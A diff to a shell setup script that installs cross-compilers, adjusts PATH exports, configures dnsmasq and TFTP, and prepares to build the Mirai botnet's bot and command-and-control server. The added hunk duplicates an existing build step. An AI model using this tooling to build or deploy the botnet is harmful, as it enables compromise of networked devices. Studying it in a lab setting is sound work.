@@ -16,11 +16,11 @@ fi
 cd "$ROOT/xcompilers" || exit 5
 for filename in *.tar.bz2; do
   tar -jxf "${filename}"
-  echo "export PATH=$PATH:$ROOT/xcompile/${filename%%.*}/bin" >> $ROOT/.mirairc
+  echo "export PATH=\$PATH:$(pwd)/${filename%%.*}/bin" >> $ROOT/.mirairc
   echo ">> Compiler ${filename%%.*} installed"
 done
 
-echo "export PATH=$PATH:/usr/local/go/bin" >> $ROOT/.mirairc
+echo "export PATH=\$PATH:/usr/local/go/bin" >> $ROOT/.mirairc
 echo "export GOPATH=$HOME/go" >> /$ROOT/.mirairc
 echo "source ~/.mirairc" >> $ROOT/.bashrc
 
@@ -57,6 +57,10 @@ mkdir -p /server/tftp
 killall dnsmasq || true
 cp $ROOT/mirai_root/scripts/dnsmasq.conf /etc/dnsmasq.conf
 dnsmasq
+
+echo "Building mirai bot and cnc..."
+cd $ROOT/mirai_root/mirai || exit 5
+chmod g+x build.sh
 
 echo "Building mirai bot and cnc..."
 cd $ROOT/mirai_root/mirai || exit 5
